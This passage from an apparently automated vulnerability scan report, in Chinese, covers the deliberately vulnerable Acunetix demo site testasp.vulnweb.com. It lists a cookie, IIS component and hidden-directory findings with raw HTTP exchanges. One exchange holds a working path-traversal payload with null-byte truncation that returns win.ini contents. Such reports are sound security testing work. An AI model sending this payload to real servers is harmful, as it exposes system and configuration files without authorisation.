&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;acuforum forums&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
	&lt;table width="100%" border="0" cellspacing="0" cellpadding="5"&gt;
      &lt;tr&gt;
        &lt;td class="tableheader"&gt;Forum&lt;/td&gt;
        &lt;td class="tableheader"&gt;Threads&lt;/td&gt;
        &lt;td class="tableheader"&gt;Posts&lt;/td&gt;
        &lt;td class="tableheader"&gt;Last Post&lt;/td&gt;
      &lt;/tr&gt;   
	&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=0'&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Talk about Acunetix Web Vulnerablity Scanner&lt;/div&gt;&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;1/13/2025 6:27:08 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#e9ffe9'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=1'&gt;Weather&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;What weather is in your town right now&lt;/div&gt;&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;1/13/2025 6:21:00 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=2'&gt;Miscellaneous&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Anything crossing your mind can be posted here&lt;/div&gt;&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;1/13/2025 4:25:17 AM&lt;/td&gt;&lt;/tr&gt;
	&lt;/table&gt;&lt;!-- InstanceEndEditable --&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr align="right" bgcolor="#FFFFFF"&gt; 
    &lt;td colspan="2" class="footer"&gt;Copyright 2019 Acunetix Ltd.&lt;/td&gt; 
  &lt;/tr&gt; 
&lt;/table&gt; 
&lt;div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px"&gt;
	&lt;p style="padding-left:20%;padding-right:20%"&gt;&lt;b&gt;Warning&lt;/b&gt;: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</div></div><div class="h3group" xmlns=""><h3>問題
						 
						2
						 
						/
						 
						2</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attSameSiteCookie">SameSite 屬性不安全、不適當或遺漏的 Cookie</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_2">中</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">4.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N/E:U/RL:O/RC:C" target="_blank">AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N/E:U/RL:O/RC:C/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">ASPSESSIONIDQQQQQDST (Cookie)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>將 Cookie 限制為第一方或相同網站環境定義以預防 Cookie 資訊洩漏。如果沒有設置額外的保護措施（如反 CSRF 記號），攻擊者可以延伸為偽造跨網站要求 (CSRF) 攻擊。</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>SameSite 屬性不適當、不安全或遺漏的機密 Cookie</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attSameSiteCookie_Adv">檢閱將 SameSite Cookie 屬性配置為建議值的可能解決方案</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">回應包含 SameSite 屬性不安全、不適當或遺漏的機密 Cookie，這可能會導致 Cookie 資訊洩漏。如果沒有設置額外的保護措施，可能會衍生出偽造跨網站要求 (CSRF) 攻擊。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /_vti_cnf/ HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:49:52 GMT
Content-Length: 926
<span class="highlight">Set-Cookie: ASPSESSIONIDQQQQQDST=BEAFDCMBLDINGEJIJMAAPFMF; path=/</span>

vti_encoding:SR|utf8-nl
vti_timelastmodified:TR|05 Oct 2007 10:01:19 -0000
vti_extenderversion:SR|4.0.2.8912
vti_cacheddtm:TX|05 Oct 2007 10:01:19 -0000
vti_filesize:IR|3663
vti_cachedlinkinfo:VX|Q|styles.css H|http://www.acunetix.com/ S|Images/logo.gif H|Templatize.asp H|Default.asp H|Search.asp
vti_cachedsvcrellinks:VX|FQUS|acuforum/styles.css NHHS|http://www.acunetix.com/ FSUS|acuforum/Images/logo.gif FHUS|acuforum/Templatize.asp FHUS|acuforum/Default.asp FHUS|acuforum/Search.asp
vti_cachedtitle:SR|acuforum forums
vti_title:SR|acuforum forums
vti_cachedbodystyle:SR|&lt;body&gt;
vti_cachedhasbots:BR|false
vti_cachedhastheme:BR|false
vti_cachedhasborder:BR|false
vti_metatags:VR|HTTP-EQUIV=Content-Type text/html;\\ charset=iso-8859-1
vti_backlinkinfo:VX|acuforum/login.asp acuforum/register.asp acuforum/search.asp acuforum/default.asp acuforum/showthread.asp acuforum/showforum.asp acuforum/templatize.asp
</div></div><div id="attFileWin32" class="issueType" xmlns=""><div class="severity severity_2">中</div><div><h2 class="nowordwrap"><a href="#attFileWin32">Windows 檔案參數變更</a>
					 
					<span class="count">1</span><a name="attFileWin32"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attFileWin32">Windows 檔案參數變更</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_2">中</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">6.5</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N" target="_blank">AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/Templatize.asp">http://testasp.vulnweb.com/Templatize.asp</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">item (Parameter)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能檢視 Web 伺服器上任何檔案（例如：資料庫、使用者資訊或配置檔）的內容，但受 Web 伺服器使用者的許可權限制</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>未正確地消毒使用者所輸入的危險字元</li><li>未檢查使用者輸入是否有 '..' （雙點）字串</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attFileWin32_Adv">確定所存取的檔案位於虛擬路徑中，且具有特定副檔名；從使用者輸入移除特殊字元</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">測試結果似乎表明存在弱點，因為回應中包含「win.ini」/「boot.ini」檔案的內容，證明伺服器允許遠端使用者下載系統檔案的內容。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /Templatize.asp?<span class="mark">item=/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini%00.html</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://testasp.vulnweb.com/
Connection: keep-alive
Cookie: ASPSESSIONIDSQRQRDTS=EIJDJHPABCLGBBDCGNECAEJI
Content-Length: 0


HTTP/1.1 <span class="highlight">200</span> OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:32:05 GMT
Content-Length: 3033


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;Untitled Document&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3D%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2Fwindows%2Fwin%2Eini%2500%2Ehtml" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3D%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2Fwindows%2Fwin%2Eini%2500%2Ehtml" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
		; for <span class="highlight">16-bit app support</span>
<span class="highlight">[fonts]</span>
<span class="highlight">[extensions]</span>
[mci extensions]
[files]
[Mail]
MAPI=1

		&lt;!-- InstanceEndEditable --&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr align="right" bgcolor="#FFFFFF"&gt; 
    &lt;td colspan="2" class="footer"&gt;Copyright 2019 Acunetix Ltd.&lt;/td&gt; 
  &lt;/tr&gt; 
&lt;/table&gt; 
&lt;div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px"&gt;
	&lt;p style="padding-left:20%;padding-right:20%"&gt;&lt;b&gt;Warning&lt;/b&gt;: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</div></div><div id="VulnerableComponent" class="issueType" xmlns=""><div class="severity severity_2">中</div><div><h2 class="nowordwrap"><a href="#VulnerableComponent">有弱點的元件</a>
					 
					<span class="count">1</span><a name="VulnerableComponent"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#VulnerableComponent">有弱點的元件</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_2">中</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">5.6</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">CVE：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln/detail/CVE-2014-4078" target="_blank">CVE-2014-4078</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">IIS 8.5 (Component)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>攻擊者有可能使用 Web 伺服器來攻擊其他網站，讓其身分更加隱密</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>未安裝協力廠商產品的最新修補程式或緊急修復程式</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#VulnerableComponent_Adv">將元件升級到最新穩定版本</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">AppScan 發現有弱點的元件</div></div><div class="name">測試要求和回應：</div><div class="code test">GET / HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:48:49 GMT
Content-Length: 3561
Set-Cookie: ASPSESSIONIDQQQQQDST=PFNEDCMBFBHFKEJIEKLNCBJL; path=/


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;acuforum forums&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
	&lt;table width="100%" border="0" cellspacing="0" cellpadding="5"&gt;
      &lt;tr&gt;
        &lt;td class="tableheader"&gt;Forum&lt;/td&gt;
        &lt;td class="tableheader"&gt;Threads&lt;/td&gt;
        &lt;td class="tableheader"&gt;Posts&lt;/td&gt;
        &lt;td class="tableheader"&gt;Last Post&lt;/td&gt;
      &lt;/tr&gt;   
	&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=0'&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Talk about Acunetix Web Vulnerablity Scanner&lt;/div&gt;&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;1/13/2025 6:27:08 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#e9ffe9'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=1'&gt;Weather&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;What weather is in your town right now&lt;/div&gt;&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;1/13/2025 6:21:00 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=2'&gt;Miscellaneous&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Anything crossing your mind can be posted here&lt;/div&gt;&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;1/13/2025 4:25:17 AM&lt;/td&gt;&lt;/tr&gt;
	&lt;/table&gt;&lt;!-- InstanceEndEditable --&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr align="right" bgcolor="#FFFFFF"&gt; 
    &lt;td colspan="2" class="footer"&gt;Copyright 2019 Acunetix Ltd.&lt;/td&gt; 
  &lt;/tr&gt; 
&lt;/table&gt; 
&lt;div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px"&gt;
	&lt;p style="padding-left:20%;padding-right:20%"&gt;&lt;b&gt;Warning&lt;/b&gt;: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</div></div>
				 
				
				<input type="hidden" name="sectionstart" xmlns="" />
				 
				
			<div id="attDirectoryFound" class="issueType" xmlns=""><div class="severity severity_1">低</div><div><h2 class="nowordwrap"><a href="#attDirectoryFound">偵測到隱藏目錄</a>
					 
					<span class="count">6</span><a name="attDirectoryFound"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						6</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attDirectoryFound">偵測到隱藏目錄</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_1">低</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">3.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">cgi-bin/ (Page)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能擷取網站檔案系統結構的相關資訊，其可能會幫助攻擊者對映網站</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>使用不安全的方式配置 Web 伺服器或應用程式伺服器</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attDirectoryFound_Adv">對禁止的資源發出「404 - 找不到」回應狀態碼，或將其完全移除</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">此測試嘗試檢測伺服器上的隱藏目錄/檔案。回應狀態為 200 OK 或 403 Forbidden。狀態 200 表示測試成功檢索所要求的目錄/檔案的內容。狀態 403 表示它的存在，即使不允許存取。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET <span class="mark">/cgi-bin/</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 403 Forbidden
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:49:13 GMT
Content-Length: 1233

&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/&gt;
&lt;title&gt;403 - Forbidden: Access is denied.&lt;/title&gt;
&lt;style type="text/css"&gt;
&lt;!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="header"&gt;&lt;h1&gt;Server Error&lt;/h1&gt;&lt;/div&gt;
&lt;div id="content"&gt;
 &lt;div class="content-container"&gt;&lt;fieldset&gt;
  &lt;h2&gt;403 - Forbidden: Access is denied.&lt;/h2&gt;
  &lt;h3&gt;You do not have permission to view this directory or page using the credentials that you supplied.&lt;/h3&gt;
 &lt;/fieldset&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</div></div><div class="h3group" xmlns=""><h3>問題
						 
						2
						 
						/
						 
						6</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attDirectoryFound">偵測到隱藏目錄</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_1">低</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">3.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N" target="_blank">AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">html/ (Page)
